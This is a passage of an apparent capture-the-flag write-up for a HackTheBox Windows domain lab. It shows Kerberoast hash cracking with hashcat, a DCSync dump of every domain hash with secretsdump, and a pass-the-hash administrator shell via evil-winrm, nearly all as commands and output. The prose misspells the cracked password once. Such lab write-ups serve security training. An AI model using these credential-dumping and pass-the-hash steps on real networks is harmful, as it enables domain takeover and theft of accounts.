9ecb7b3f3103d1940a70e4d84629a88b775e26e8e6f4c523dcdbffb6d662acf76e9f085f2bd90b1727307665c6336d67208c29a95e19e96ffeb1d353874da44a047d06a3e6918d113656b7a810497e8daf19260c05a894aeadb9439a83422ca65c49a6acde470d4f457c2c7dde82f3aaece8f37dfcd15a14755d5306c8d106afa2b4a610fb46115ac4c434836c742ecde4439e6bca0ae0587d3e6c98e1918e86c479ab2e428ccf2efcd763c0403f1c01ade5c311e726cff364550ca6497fa7eb7ae39b121a8beb44d310a04a8bf234adbd3a7df6bf88710fe32a031dffff7e79416e57c88572ab6ae8e536b591c9b7fcc3de8a26a8671a3b3db5b342e456ace10b92950c1efd0cad72efa9750f7d11ea7bafe0874abbdbefa76bc968c68dd85148022370d4edb4e790bdaf6ce651a5d3a60c0a6cded6fc3b
[VERBOSE] SPN removed successfully for (ethan)

```

#### Crack

`hashcat` with `rockyou.txt` cracks the hash in a couple seconds:

```

$ hashcat ethan.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
...[snip]...
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$82e55c4be492aa7195460fbb1e377398$65cf94dd43d68ab2499882e73c90e0e7b0ab5de45e2e12e5fc62cdc43f92947772ce945fae3976250b0be118d5249c7db432a553d8951e4c4030272b6049f0084e905003557813c94a6f0c1348279b6bf6ef294c8d70c596521f847802814dc00fe145e7bbaefa4a61b473615dcb5e732acdec3c927152d0f0bf8f4f523f4552b528e9e1fbbdabba1eb47ed8cc26ab2b775627dba7aa9690f18ba5956c63c4f21b277aeb5d4eb7f1c34af8bf416690990d9eca7e13e6a3ca22a73014779e9cf4480c836de4efeb4f8be6054560be6c06908cef09c0395144fe39031ad2cf09a3bbbc44f1dd033a62c9da88c774a30ec12b89459e7fdc64c1c9a674084fc657126d17be270bbe9d8534cd6d97f642ef6e8a77a571d80b7236fb2019c3aa1d9750ce52ebaabdeb4ad9551352e6984c29edcee6a24a2b110ddeec29c02110ff41957d661a55b3e166a80ce7ac619e225b09dc6166d1ba091587e21262c6489db944b9a1cf61dcbd54594891e49a206fb8f311e3f0d8fbdf74047a4e820f79c49ced080af07773da92691aa13f4b9d5448dae07d1e96093888639ad6612fa47a0a910bf6fb169900ddc9b5e8b2b54113b2e1584b284be4fe60b7691bdd69f8e83a29059cdf1b388ae4a8ce1216f202c10953b62ff0a851a5e2640cac625b01f9d68314dea074e4a99dd24ec34eeee5e0f8ff8f6135c4a4e2806699a829c93dda7b2041c64668da610eeb08f6f04ea8ca326de1f292f88d9ae1724711f45dca88ebfd344c53afd4d094d15bd923a7bb49f347cdd99634be375b15c87164bf4efef69d2bed715149542304a9eaecc5160d9a05cfc6d5ec95ae618287a98ab9c78945f18eb34ee1f0ebdff8f077758fbf760f855c5a2c639ced2eae0625572aa485b0f6870a953994cf30c3e74d193fe692e334f7be40457a30c6f8060a771b1eb8f11f1dd478ab1318146e442eed8ec89a38366b9c7c97823bb86b6abc014fe9b4591a3e8409fac0c41a4856758ceb297abbff3eb9028949f6bde18de95840a1b3201c4a8f8923a275d584972d56454a3fa449650531d55983e68e47cbae9ea96ff0cc256f8d72fe15731402b5a84e5a3d187a63af797682ddfc9e3ae3886bc0a1e2a3bb26aedf60a0722f995dcacb421ef08180185dae98687beedc688c30b8c99809fd24b98eebb64d607214289f149435e1bfdf6ae5ec09569752aea4e5a0b6bd62433f72405b974e327adfc1fd40166cf1fe960d37eab91c7c6c4bbae6b154c63a6944c3be327d057a15b69e2040fdd82419c4c783cc3c198c7ff13631af0eb5452af51ba6ebff848f43e9a9a2feb0eabe9a9b9cf21ef69084f884b918d4f8d934987a0b23ece71256e148b1798caa703b795a660055346d2b0f06f53ecb82a1068fe55d8ba31dbd41ac24333302c5e1e16fa1e4e18706446368cd420a949bce432b80dbf98e9d35107b654fe93d9bf7744e0a37870f931a7c3d9b6df96ef95347289ee7af0b0387ff1637848e7c64c8b2473c774444e2f23183a376187c96ff:limpbizkit
...[snip]...

```

ethan’s password is “limpkizkit”.

### Validate Creds

This password works for SMB:

```

oxdf@hacky$ netexec smb administrator.htb -u ethan -p limpbizkit
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\ethan:limpbizkit 

```

It doesn’t work for WinRM:

```

oxdf@hacky$ netexec winrm administrator.htb -u ethan -p limpbizkit
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [-] administrator.htb\ethan:limpbizkit

```

I don’t need a shell at this point, but if I did, I could use [RunasCs](https://github.com/antonioCoco/RunasCs).

## Shell as administrator

### Enumeration

ethan has `DCSync` privileges over the domain:

![image-20241117150439982](/img/image-20241117150439982.png)

### Dump Hashes

With this privilege, ethan can dump hashes for the domain with `secretsdump.py`:

```

oxdf@hacky$ secretsdump.py ethan:limpbizkit@dc.administrator.htb
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:02cb8258df07966e32677128e5ff1d26:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:02cb8258df07966e32677128e5ff1d26:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:811213be007de8ae1e546aaed7c6ac42343d7211a60f938d69733bce9ae2c5c9
administrator.htb\michael:aes128-cts-hmac-sha1-96:31dbcbe5dbd7ccb1faf5272d83e0f8eb
administrator.htb\michael:des-cbc-md5:0dbf5134d0c2ec8a
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:f88ef08792b0955ae4ccebf7768098b1fe0ae67c84d72c0dcc48c5e7fcb38bae
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:e189232083e5dbfcf489d46181fe7e73
administrator.htb\benjamin:des-cbc-md5:d085a40489fdb6a4
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...

```

### Shell

I can use the local administrator hash to get a shell with Evil-WinRM:

```

oxdf@hacky$ evil-winrm -i dc.administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And read the final flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4cf2d737************************

```